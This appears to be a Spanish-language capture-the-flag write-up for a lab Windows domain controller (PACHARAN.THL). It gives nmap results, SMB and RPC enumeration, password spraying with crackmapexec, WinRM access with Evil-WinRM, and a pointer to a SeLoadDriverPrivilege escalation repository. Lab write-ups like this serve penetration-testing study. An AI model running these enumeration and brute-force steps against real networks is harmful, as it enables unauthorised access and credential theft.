
-------
- Tags: #smb #msfv #evilwinrm #rpc #AD
---------

```bash
# Nmap 7.94SVN scan initiated Wed Oct  2 21:38:30 2024 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49681,49682,49685,49688,49713,56895 -sCV -v -oN targeted 192.168.69.69
Nmap scan report for 192.168.69.69 (192.168.69.69)
Host is up (0.00090s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-03 02:38:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49682/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
56895/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:F3:CF:1E (Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1h00m14s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f3:cf:1e (Oracle VirtualBox virtual NIC)
| Names:
|   WIN-VRU3GG3DPLJ<00>  Flags: <unique><active>
|   PACHARAN<00>         Flags: <group><active>
|   PACHARAN<1c>         Flags: <group><active>
|   WIN-VRU3GG3DPLJ<20>  Flags: <unique><active>
|_  PACHARAN<1b>         Flags: <unique><active>
| smb2-time: 
|   date: 2024-10-03T02:39:17
|_  start_date: 2024-10-02T19:26:48

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  2 21:39:39 2024 -- 1 IP address (1 host up) scanned in 69.07 seconds
```

- Entramos con [[smbmap]]:
```bash
smbmap -H <IP> -u 'invitado'
```

- Dentro tenemos el recurso **orujo.txt**, el cual contiene una contrasena

- Con estas credenciales podemos validara con [[crackmapexec]] y vemos que son validas por [[smb]]

- Con estas credenciales podemos acceder al otro recurso compartido **PACHARAN**, el cual contiene un listado potencial de contrasenas.


- Lo que hacemos ahora es enumerar usuarios (aqui existen muchas opciones como: Brute RID, enum4linux, La herramienta de s4vitar, etc), en este caso, podemos acceder a [[rpclient]] con las credenciales del user *orujo*
```bash
rpcclient -U orujo <IP>
//Introducir Password

enumdomusers
```

- Ahora tenemos un listado de usuarios validos del dominio y una lista de Passwords. Probamos fuerza bruta para ver si encuentra credenciales validas.
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

- Con esto obtenemos las credenciales validas del usuario **Whisky**

- Igualmente con este user podemos ahora accder via [[rpclient]], (se nos deja una pista haciendo enfasis a las impresoras), si enumeramos podemos ver una password
```bash
rpclient -u Whisky <IP>
//
enumprinters
```
- Con esta contrasena volvemos a buscar credenciales validas para esta password con [[crackmapexec]]
```bash
crackmapexec smb <IP> -u users.txt -p "ContrasenaEncontrada"
```

- Ahora disponemos de las credenciales validas para el usuario **Chivas Regal**
- Con estas credenciales si validamos por winrm, vemos que forma parte del grupo **Remote Managemnet**, y pa dentro con [[Evil-WinRM]]

-----

## PRIVESC

- Para la escalada vemos que tenemos el permiso habilitado de **SeLoadDriverPrivilege**

- Podemos seguir simplemente una serie de pasos de este repositorio de github y escalar privilegios

- [Github](https://github.com/k4sth4/SeLoadDriverPrivilege)


